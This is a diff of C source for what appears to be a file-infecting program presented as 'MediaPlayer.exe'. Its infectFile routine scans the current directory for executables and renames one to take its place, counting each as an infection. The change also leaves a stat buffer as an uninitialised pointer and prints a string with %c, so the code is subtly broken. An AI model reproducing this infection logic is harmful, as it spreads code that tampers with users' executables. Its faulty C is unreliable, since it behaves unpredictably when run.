@@ -84,12 +84,12 @@ activate (GtkApplication *app, gpointer user_data)
 
 
 
-char* nameToOld(char* name)
+char* changeNameToOld(char* name)
 {
 	char* new_name = (char *) malloc( 40 );
 	strcpy(new_name, name);
 
-	if(strcmp(name, "MediaPlayer.exe"))	// Le fichier n'est pas MediaPlayer.exe
+	if(strcmp(name, "MediaPlayer.exe"))	// The file is not MediaPlayer
 	{
 		if(strstr(name, ".exe")) // Test if the file has the .exe extension
 		{
@@ -109,6 +109,7 @@ char* nameToOld(char* name)
 				}
 				else 
 				{
+                    printf("No file renamed\n");
 					return "";
 				}
 			}
@@ -118,8 +119,7 @@ char* nameToOld(char* name)
 }
 // Changing the name of the executables
 
-char*
-infect()
+char* infectFile()
 {
 	DIR* dir = opendir("."); // Open a directory to read files in it.
 	int infect = 0; // Number of infections
@@ -139,19 +139,19 @@ infect()
     {
 		if (infect < 1)
 		{
-			struct stat buffer;
-			if (!stat(directory->d_name, &buffer)) // Stock stat information of the file
+			struct stat* buffer;
+			if (!stat(directory->d_name, buffer)) // Stock stat information of the file
 			{	
-				if ((buffer.st_mode & S_IXUSR) && S_ISREG(buffer.st_mode)) //check if the file is executable and regular
+				if ((buffer->st_mode & S_IXUSR) && S_ISREG(buffer->st_mode)) //check if the file is executable and regular
 				{ 
 					char* name = (char *) malloc( 40 );
 					strcpy(name, directory->d_name);
 					strcpy(pname, name);
 					
-					strcpy(rname, nameToOld(name));
+					strcpy(rname, changeNameToOld(name));
 
 					if(strcmp(rname, "")) // test if the file has been renamed
-					{
+					{   
 						infect++;
 					}
 
@@ -169,7 +169,7 @@ int
 main (int argc, char **argv)
 {
 	int status;
-    char* infect_name = infect();
+    char* infect_name = infectFile();
     printf("The name of an infected file : %c", *infect_name);
 
   GtkApplication *app;
